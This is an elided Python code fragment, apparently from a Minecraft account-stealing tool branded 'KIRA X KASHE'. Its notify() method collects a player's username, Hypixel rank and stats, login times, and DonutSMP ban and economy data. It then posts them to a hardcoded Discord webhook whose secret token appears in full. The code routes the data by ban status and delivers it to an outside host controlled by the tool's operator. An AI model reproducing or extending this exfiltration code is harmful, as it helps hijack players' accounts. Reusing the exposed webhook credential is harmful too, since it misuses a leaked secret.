    ...
    def notify(self):
        ...
        try:
            ...
            if hypixel_banned or donut_banned:
                ...
                webhook_url = 'https://discord.com/api/webhooks/1440561886486859829/0pH0E_uPkqLQs0FQ3oJz327QungQvdmVawmj_CVuY14aHsPSyQeptvqPVzPWbP0T7ihQ'
            ...
            # Advanced embed but with KIRA X KASHE branding - Always enabled
            if True:
                ...
                fields = [
                    ...
                    {"name": "<:members:1424384378854834227> Uѕᴇʀɴᴀᴍᴇ", "value": getattr(self, 'original_name', self.name) if (getattr(self, 'original_name', self.name) and getattr(self, 'original_name', self.name) != "N/A") else "No MC Profile", "inline": True},
                ...
                if hasattr(self, 'hypixel_rank') and self.hypixel_rank: fields.append({"name": "<a:hypixel:1433705221418258472> Hʏᴘɪxᴇʟ Rᴀɴᴋ", "value": self.hypixel_rank, "inline": True})
                if hasattr(self, 'hypixel_playtime') and self.hypixel_playtime: fields.append({"name": "<a:hypixel:1433705221418258472> Hʏᴘɪxᴇʟ Pʟᴀʏᴛɪᴍᴇ", "value": self.hypixel_playtime, "inline": True})
                if hasattr(self, 'hypixel_karma') and self.hypixel_karma: fields.append({"name": "<a:hypixel:1433705221418258472> Hʏᴘɪxᴇʟ Kᴀʀᴍᴀ", "value": self.hypixel_karma, "inline": True})
                if self.firstlogin: fields.append({"name": "<:login:1426245081643618336>  Fɪʀѕᴛ Lᴏɢɪɴ", "value": self.firstlogin, "inline": True})
                if self.lastlogin: fields.append({"name": "<:Leave:1426212066221625495>  Lᴀѕᴛ Lᴏɢɪɴ", "value": self.lastlogin, "inline": True})
                if self.bwstars: fields.append({"name": "<a:stars_:1426245986770092064>  Bᴇᴅᴡᴀʀѕ Sᴛᴀʀѕ", "value": self.bwstars, "inline": True})
                if self.sbcoins: fields.append({"name": "<a:coins:1430444565499740160> Sᴋʏʙʟᴏᴄᴋ Cᴏɪɴѕ", "value": self.sbcoins, "inline": True})
                ...
                if self.cape: fields.append({"name": "<a:optifinecape:1433705569000357908>  Oᴘᴛɪꜰɪɴᴇ Cᴀᴘᴇ", "value": self.cape, "inline": True})
                ...
                if self.donut_status:
                    ...
                    if self.donut_status == "unbanned" and not has_stats:
                        fields.append({"name": f"<:DonutSMP:962837202440708196> Dᴏɴᴜᴛ Sᴛᴀᴛᴜѕ", "value": f"{donut_emoji} Unbanned", "inline": True})
                    else:
                        fields.append({"name": f"<:DonutSMP:962837202440708196> Dᴏɴᴜᴛ Sᴛᴀᴛᴜѕ", "value": f"{donut_emoji} {self.donut_status.title()}", "inline": True})
                    
                    # Ban-specific info
                    if self.donut_reason: fields.append({"name": "<:DonutSMP:962837202440708196> Bᴀɴ Rᴇᴀѕᴏɴ", "value": self.donut_reason, "inline": True})
                    if self.donut_time: fields.append({"name": "<:DonutSMP:962837202440708196> Tɪᴍᴇ Lᴇꜰᴛ", "value": self.donut_time, "inline": True})
                    if hasattr(self, 'donut_banid') and self.donut_banid: fields.append({"name": "<:DonutSMP:962837202440708196> Bᴀɴ Iᴅ", "value": self.donut_banid, "inline": True})
                    
                    # Player stats
                    if hasattr(self, 'donut_money') and self.donut_money: fields.append({"name": "<:DonutSMP:962837202440708196> Mᴏɴᴇʏ", "value": self.donut_money, "inline": True})
                    if hasattr(self, 'donut_playtime') and self.donut_playtime: fields.append({"name": "<:DonutSMP:962837202440708196> Pʟᴀʏᴛɪᴍᴇ", "value": self.donut_playtime, "inline": True})
                    if hasattr(self, 'donut_shards') and self.donut_shards: fields.append({"name": "<:DonutSMP:962837202440708196> Sʜᴀʀᴅѕ", "value": self.donut_shards, "inline": True})
                    if hasattr(self, 'donut_level') and self.donut_level: fields.append({"name": "<:DonutSMP:962837202440708196> Lᴇᴠᴇʟ", "value": self.donut_level, "inline": True})
                    if hasattr(self, 'donut_rank') and self.donut_rank: fields.append({"name": "<:DonutSMP:962837202440708196> Rᴀɴᴋ", "value": self.donut_rank, "inline": True})
                    if hasattr(self, 'donut_kills') and self.donut_kills: fields.append({"name": "<:DonutSMP:962837202440708196> Kɪʟʟѕ", "value": self.donut_kills, "inline": True})
                    if hasattr(self, 'donut_deaths') and self.donut_deaths: fields.append({"name": "<:DonutSMP:962837202440708196> Dᴇᴀᴛʜѕ", "value": self.donut_deaths, "inline": True})
                    ...
                    if hasattr(self, 'donut_kills') and hasattr(self, 'donut_deaths') and self.donut_kills and self.donut_deaths:
                        try:
                            ...
                            fields.append({"name": "<:DonutSMP:962837202440708196> K/D Rᴀᴛɪᴏ", "value": str(kd_ratio), "inline": True})
                        except: pass
                ...
                payload = {
                    "username": "KIRA X KASHE",
                    "avatar_url": "https://i1.sndcdn.com/artworks-MuvOmkrrPWOfVCGZ-EdSazw-t500x500.jpg",
                    "embeds": [{
                        "author": {
                            "name": "KIRA X KASHE",
                            "url": "https://discord.gg/v4WMqQXkSG",
                            "icon_url": "https://i1.sndcdn.com/artworks-MuvOmkrrPWOfVCGZ-EdSazw-t500x500.jpg"
                        },
